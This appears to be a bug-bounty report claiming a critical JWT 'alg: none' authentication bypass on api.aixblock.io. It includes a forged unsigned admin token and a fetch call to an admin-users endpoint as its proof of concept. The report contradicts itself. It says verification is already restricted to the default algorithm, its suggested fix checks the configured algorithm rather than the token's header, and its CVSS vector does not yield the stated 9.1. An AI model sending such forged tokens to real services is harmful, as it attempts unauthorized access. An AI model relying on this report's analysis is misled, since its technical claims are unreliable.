# CRITICAL: JWT Algorithm Confusion Vulnerability (CVSS 9.1)

## Summary

**Severity**: Critical (CVSS 9.1)
**Asset**: `api.aixblock.io`
**Reward**: $750 cash + 1,500 USDC in tokens

## Description

The JWT token validation in `workflow/packages/backend/api/src/app/helper/jwt-utils.ts` is vulnerable to algorithm confusion attacks. The `decodeAndVerify` function only restricts to the default algorithm but doesn't explicitly reject `none` algorithm tokens, allowing attackers to bypass authentication by crafting tokens with `alg: "none"`.

## Impact

- Complete authentication bypass
- Unauthorized access to all protected endpoints
- Potential for privilege escalation
- Data exfiltration and system compromise

## Proof of Concept

```javascript
// Malicious JWT token with alg: "none"
const maliciousToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTY0MDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.";

// This token will be accepted by the vulnerable system
fetch('https://api.aixblock.io/api/v1/admin/users', {
  headers: {
    'Authorization': `Bearer ${maliciousToken}`
  }
});
```

## Recommended Fix

```typescript
async decodeAndVerify<T>({
    jwt,
    key,
    algorithm = ALGORITHM,
    issuer = ISSUER,
    audience,
}: VerifyParams): Promise<T> {
    const verifyOptions: VerifyOptions = {
        algorithms: [algorithm], // Explicitly restrict to specified algorithm
        ...spreadIfDefined('issuer', issuer),
        ...spreadIfDefined('audience', audience),
    }

    // Additional validation: reject none algorithm
    if (algorithm === 'none') {
        throw new Error('Algorithm "none" is not allowed');
    }

    return new Promise((resolve, reject) => {
        jwtLibrary.verify(jwt, key, verifyOptions, async (err, payload) => {
            if (err) {
                return reject(err)
            }
            return resolve(payload as T)
        })
    })
}
```

## References

- [CVE-2016-10555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10555)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0 JWT Vulnerabilities](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)

## CVSS Score Breakdown

- **Attack Vector**: Network (N)
- **Attack Complexity**: Low (L)
- **Privileges Required**: None (N)
- **User Interaction**: None (N)
- **Scope**: Unchanged (U)
- **Confidentiality**: High (H)
- **Integrity**: High (H)
- **Availability**: High (H)

**Base Score**: 9.1 (Critical)
